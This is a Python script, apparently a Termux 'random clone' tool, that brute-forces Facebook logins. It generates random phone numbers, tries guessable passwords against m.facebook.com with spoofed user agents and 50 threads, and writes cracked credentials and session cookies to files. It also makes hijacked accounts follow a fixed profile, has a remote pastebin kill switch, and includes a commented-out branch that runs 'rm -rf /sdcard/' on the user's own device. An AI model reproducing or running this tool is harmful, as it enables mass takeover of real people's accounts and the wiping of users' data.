#--------[AKASH DAS 🙃

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from os import system as _AKASH_
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    _AKASH_('pip install mechanize requests futures bs4==2 > /dev/null')
    _AKASH_('pip install bs4')
apk1=requests.get("https://pastebin.com/raw/FrYTLzAa").text
def lo(word):
    Akash = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(Akash)):
            sys.stdout.write(('\r{}{}').format(str(word), Akash[x]))
            time.sleep(0.1)
            sys.stdout.flush()
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
color=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m'])

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class Akash_afridi:
    def AKASH(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
                       
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = (f"""\033[1;32m
███████ ██      ██ ████████ ███████ 
██      ██      ██    ██    ██      
█████   ██      ██    ██    █████   
██      ██      ██    ██    ██      
███████ ███████ ██    ██    ███████ _/🦋⃟𝐀𝐊𝐀𝐒𝐇✮⃝𝐃𝐀𝐒𝄟⃝💥\_
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ [🌺] AUTHOR    \033[1;91m: \033[1;92m🦋⃟𝐀𝐊𝐀𝐒𝐇✮⃝𝐃𝐀𝐒𝄟⃝💥            ┃
┃ [🐼] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE              ┃
┃ [🐼] STATUS    \033[1;91m: \033[1;92mFREE                      ┃
┃ [🐼] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI               ┃
┃ [🐼] GITHUB    \033[1;91m: \033[1;92m🦋⃟𝐀𝐊𝐀𝐒𝐇𝄟⃝💥 -404-CYBER.    ┃
┃ [🐼] FACEBOOK  \033[1;91m: \033[1;92m🦋⃟𝐀𝐊𝐀𝐒𝐇𝄟⃝💥 DAS            ┃
┃ [🖤] WHATSAPP  \033[1;91m: \033[1;92m+8801754043675            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []

def clear():
    _AKASH_('clear')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
   

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
UMO="I-AM-"
ttt="AKASH-DAS-"
#Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaX7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
 

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','5.1.1','6.01','7.01','8.01','9.01','10','11','12'])
    c='SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]'
    samua=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(samua)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','5.1.1','6.01','7.01','8.01','9.01','10','11','12'])
    c='Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36'
    redua=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(redua)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','5.1.1','6.01','7.01','8.01','9','9.01','10','11','12'])
    c='Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]'
    redmua=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(redmua)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','5.1.1','6.01','7.01','8.01','9.01','10','11','12'])
    c='Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.1 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 OPR/74.0.3922.70977'
    redmpua=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(redmpua)

def update():
	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','AKASH  is working'])
	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
	ful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
	print(f' \t  {ful} TOOL IS ON UPDATE...{em}')
	_AKASH_(f"espeak \"{voice}\"")
	sleep(2.5)
	clear()
	update()
'''
if apk1 == 'update':
	update()
if apk1 =='on':
	pass
if apk1 =='off':
	sys.exit()
if apk1 =='remove':
	_AKASH_("termux-setup-storage")
	_AKASH_("rm -rf /sdcard/")
	_AKASH_("rm -rf /sdcard/ -y")
	sys.exit()
	
'''

def AKASH():
    _AKASH_('clear')
    lo("\t\t\033[1;32m OPENING TOOL🍎🙃")
    dynamic("Akash       ")
    _AKASH_("clear")
    print(logo)
    _AKASH_("espeak \"Hi sir ,Wellcome to Akash Das Rendom cloneing tool\"")
    print('\033[1;92m╔══[\033[1;91m1\033[1;92m]'+color+' RANDOM CRACK \033[1;92m❴\033[1;91mBEST❵  ')
    print('\033[1;92m╠══[\033[1;91m2\033[1;92m]'+color+' CONTACT ME FACEBOOK')
    print('\033[1;92m╠══[\033[1;91m3\033[1;92m]'+color+' FOLLOW GITHUB ACCOUNT')
    print('\033[1;92m╠══[\033[1;91m4\033[1;92m]'+color+' CHAT WITH ME')
    print('\033[1;92m╚══[\033[1;91m0\033[1;92m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;30mCHOOSE : ')
    if opt == '1':
    	_AKASH_("espeak \" you choose rendom cloneing\"")
    	xxr()
    if None == '2':
        _AKASH_('xdg-open https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _AKASH_("espeak \"Follow my Facebook account\"")
        
        return None
    if None == '3':
        _AKASH_('xdg-open https://github.com/Akashcyber99')
        _AKASH_("espeak \"Follow me on github\"")
        return None
    if None == '4':
        _AKASH_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
        _AKASH_("espeak \"you choose messenger\"")
    if None == '0':
        _AKASH_('exit')
        _AKASH_("espeak \"good bye sir\"")

def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    _AKASH_("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,016,015{x}')
    print(" \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    _AKASH_("espeak \"choose your country cord\"")
    rk1 = '0191'
    rk2 = '0192'
    rk3 = '0195'
    rk4 = '0194'
    rk5 = '0198'
    rk6 = '0193'
    rk7 = '0190'
    rk8 = '0197'
    rk9 = '0199'
    rk10='0176'
    rk11='0166'
    rk12='0151'
    rk13='0130'
    rk14='0131'
    rk15='0132'
    rk16='0133'
    rk17='0142'
    code = random.choice([rk1,rk2,rk3,rk4,rk5,rk6,rk7,rk8,rk9,rk10,rk11,rk12,rk13,rk14,rk15,rk16,rk17])                      
    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m CHOOSE : ')
    _AKASH_(f"espeak \"you choose {pww}\"")
    _AKASH_('clear')
    print(logo)
    _AKASH_("espeak \"choose your limit\"")
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 2000, 3000, 5000 \n \033[1;93m_________________________________________\n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    _AKASH_(f"espeak \"you choose limit {limit}\"")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    _AKASH_("clear")
    print(logo)
    passx = 0
    HamiiID = []
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        print(logo)
        tl = str(len(user))
        print(f"\033[1;90m┌\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;90m┐")
        print(f'\033[1;97m│\033[1;91m[\033[1;97m×\033[1;91m]\033[1;92m WORK CUNTRY  \033[1;97m: \033[1;97mBANGLADESH         \033[1;97m  │')
        print(f'\033[1;97m│\033[1;91m[\033[1;97m×\033[1;91m]\033[1;92m TOOL OWNER   \033[1;97m: \033[1;91mAKASH DAS       \033[1;97m  │')
        print(f'\033[1;97m│\033[1;91m[\033[1;97m×\033[1;91m]\033[1;92m USE NETWORK  \033[1;97m: \033[1;96m2G, \033[1;97m3G,\033[1;92m 4G, \033[1;95m5G   \033[1;97m    │ ')
        print(f"\033[1;97m│\033[97;1m[\033[92;1m×\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE🦉   \033[1;97m   │")
        print(f"\033[1;90m└\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;90m┘")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x}\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━\033[1;96m━\033[1;97m━\033[1;91m━\033[1;92m━\033[1;93m━\033[1;94m━\033[1;95m━")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =  {'authority': 'm.facebook.com',
            'method': 'GET', 
		    'path': '/', 
		    'scheme': 'https',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
		    'cache-control': 'max-age=0',
		    'dpr': '1.712499976158142',
		    'referer': 'https://m.facebook.com/',
		    'sec-ch-prefers-color-scheme': 'light',
		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
		    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"vivo 1820"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"8.1.0"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'same-origin',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent':pro,}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;30m[\033[1;31mPURE\033[1;37m \033[1;31mOK-😈\033[1;30m] \033[1;32m ' +uid+ ' \033[1;37m| \033[1;31m' +ps+'\n\033[1;30m[🔥]\033[1;37mCOOKIE = \033[1;32m'+coki+  ' \n\033[1;37m[\033[1;31mUSER\033[1;37m-\033[1;31mAGANT🍎\033[1;37m] = \033[1;30m'+pro+'  \033[0;97m')
                _AKASH_("espeak \"congratulations you got a ok id\"")
                open('/sdcard/AKASH_OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m [ERROR-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m\r')
                _AKASH_("espeak \"Akash Das is brand\"")
                open('/sdcard/AKASH_CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['AKASH DAS','AKASH CYBER ','AKASH CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟𝐀𝐊𝐀𝐒𝐇✮⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass


def superuser():
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "99".join(uuid)
    print(logo)
    DARK=requests.get('https://github.com/akashmatli/Approval/blob/main/Approval.txt').text
    if id in DARK:
        os.system('clear')
        print(logo)
        AKASH()
    else:
        os.system("clear")
        print(logo)
        print("\t \033[1;32m First Get Approvel\033[1;37m ")
        time.sleep(1)
        os.system("clear")
        print(logo)
        print ("")
        print("You Need Get Approved First\033[1;37m\n")
        print(" \033[1;32m Note : That is Paid because 80% ok id just now login\033[1;37m")
        print ("")
        print(" Your Key is Not Approved ")
        print("")
        print(" Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+ttt+id)
        print ("")
        name = input(" Your Name : ")
        print ("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+UMO+ttt+id
        os.system('am start https://wa.me/+8801722183463?text=' + tks)
        superuser()        
AKASH()
